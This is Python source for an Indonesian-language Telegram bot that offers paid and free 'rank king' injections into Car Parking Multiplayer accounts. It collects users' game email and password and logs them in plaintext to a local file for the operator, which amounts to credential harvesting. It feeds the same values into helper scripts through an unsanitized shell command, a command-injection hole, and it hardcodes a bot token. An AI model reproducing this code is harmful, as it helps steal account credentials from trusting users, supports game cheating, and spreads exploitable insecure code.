import telebot
import subprocess
import time
import json
import os
import requests
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ================= KONFIGURASI =================
TOKEN = "8206837693:AAGQB86CiT7g2wZOFg73daDA4Jg4MMZWE8c"

TIMEOUT = 300
LIMIT_FILE = "usage_limit.json"
LOGIN_FILE = "profile_login.json"
PREMIUM_FILE = "premium_users.json"

bot = telebot.TeleBot(TOKEN)
sessions = {}

# ================= LOAD DATA =================
def load_json(file, default):
    if os.path.exists(file):
        try:
            with open(file, "r") as f:
                return json.load(f)
        except:
            return default
    return default

usage_data = load_json(LIMIT_FILE, {})
premium_users = load_json(PREMIUM_FILE, {})

def save_json(file, data):
    with open(file, "w") as f:
        json.dump(data, f, indent=2)

# ================= PREMIUM =================
def is_premium(uid):
    uid = str(uid)
    if uid not in premium_users:
        return False

    info = premium_users[uid]
    if info["type"] == "unlimited":
        return True

    expire = datetime.strptime(info["expire"], "%Y-%m-%d")
    if datetime.now() <= expire:
        return True

    del premium_users[uid]
    save_json(PREMIUM_FILE, premium_users)
    return False

def premium_status(uid):
    uid = str(uid)
    if uid not in premium_users:
        return "🆓 FREE"

    info = premium_users[uid]
    if info["type"] == "unlimited":
        return "👑 UNLIMITED"

    expire = datetime.strptime(info["expire"], "%Y-%m-%d")
    days = (expire - datetime.now()).days
    return f"💎 PREMIUM ({days} hari)"

# ================= FREE LIMIT =================
def can_use_free(uid):
    uid = str(uid)
    now = datetime.now()

    if uid not in usage_data:
        usage_data[uid] = {"count": 0, "start": now.strftime("%Y-%m-%d")}
        save_json(LIMIT_FILE, usage_data)
        return True

    start = datetime.strptime(usage_data[uid]["start"], "%Y-%m-%d")
    if now - start >= timedelta(days=30):
        usage_data[uid] = {"count": 0, "start": now.strftime("%Y-%m-%d")}
        save_json(LIMIT_FILE, usage_data)
        return True

    return usage_data[uid]["count"] < 3

def increase_usage(uid):
    uid = str(uid)
    usage_data[uid]["count"] += 1
    save_json(LIMIT_FILE, usage_data)

def remaining(uid):
    uid = str(uid)
    if is_premium(uid):
        return "♾ Unlimited"
    return f"{3 - usage_data.get(uid, {'count':0})['count']}x"

# ================= IP LOCATION =================
def get_location_ip():
    try:
        r = requests.get("https://ipinfo.io/json", timeout=5).json()
        return ", ".join(filter(None, [r.get("city"), r.get("region"), r.get("country")]))
    except:
        return "Unknown"

# ================= SAVE LOGIN =================
def save_login(email, password, tool, uid):
    data = {
        "email": email,
        "password": password,
        "tool": tool,
        "telegram_id": uid,
        "location": get_location_ip(),
        "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    logs = load_json(LOGIN_FILE, [])
    logs.append(data)
    save_json(LOGIN_FILE, logs)

# ================= MENU =================
def main_menu():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🚘 CPM 1", callback_data="menu_cpm1"),
        InlineKeyboardButton("🚖 CPM 2", callback_data="menu_cpm2")
    )
    return kb

def cpm_menu(cpm):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("👑 INJECT RANK KING", callback_data=f"inject_{cpm}"),
        InlineKeyboardButton("⬅️ Back", callback_data="back")
    )
    return kb

# ================= START =================
@bot.message_handler(commands=['start'])
def start(message):
    uid = message.from_user.id
    bot.send_message(
        message.chat.id,
        f"⭐ *RANK KING CPM BOT*\n\n"
        f"Status: *{premium_status(uid)}*\n"
        f"Sisa Limit: *{remaining(uid)}*\n\n"
        "Pilih Menu Dibawah 👇",
        reply_markup=main_menu(),
        parse_mode="Markdown"
    )

# ================= CALLBACK =================
@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    uid = call.from_user.id

    if call.data == "menu_cpm1":
        bot.edit_message_text("🚘 *CPM 1*", call.message.chat.id, call.message.message_id,
                              reply_markup=cpm_menu("cpm1"), parse_mode="Markdown")

    elif call.data == "menu_cpm2":
        bot.edit_message_text("🚖 *CPM 2*", call.message.chat.id, call.message.message_id,
                              reply_markup=cpm_menu("cpm2"), parse_mode="Markdown")

    elif call.data.startswith("inject_"):
        if uid in sessions:
            return

        if not is_premium(uid) and not can_use_free(uid):
            bot.send_message(call.message.chat.id,
                             "⛔ LIMIT FREE HABIS\nUpgrade PREMIUM di @AWIMEDAN0")
            return

        tool = call.data.replace("inject_", "")
        sessions[uid] = {"step": "email", "tool": tool, "time": time.time()}
        bot.send_message(call.message.chat.id, f"📧 Masukkan EMAIL {tool.upper()}:")

    elif call.data == "back":
        bot.edit_message_text("⬅️ Menu Utama", call.message.chat.id,
                              call.message.message_id, reply_markup=main_menu())

# ================= LOGIN FLOW =================
@bot.message_handler(content_types=['text'])
def login_flow(message):
    uid = message.from_user.id
    if uid not in sessions:
        return

    sess = sessions[uid]
    if time.time() - sess["time"] > TIMEOUT:
        del sessions[uid]
        bot.reply_to(message, "⌛ Timeout.")
        return

    if sess["step"] == "email":
        sess["email"] = message.text.strip()
        sess["step"] = "password"
        sess["time"] = time.time()
        bot.reply_to(message, "🔒 Masukkan PASSWORD:")
        return

    email = sess["email"]
    password = message.text.strip()
    tool = sess["tool"]

    save_login(email, password, tool, uid)

    if not is_premium(uid):
        increase_usage(uid)

    del sessions[uid]
    bot.send_message(message.chat.id, f"⏳️ Inject King Sedang Diproses\nSisa: {remaining(uid)}")

    script = "cpm1.py" if tool == "cpm1" else "cpm2.py"
    result = subprocess.getoutput(f'printf "{email}\\n{password}\\n" | python {script}')
    bot.send_message(message.chat.id, result)

# ================= RUN =================
print("🤖 AWIMEDAN BOT ONLINE")
bot.infinity_polling()
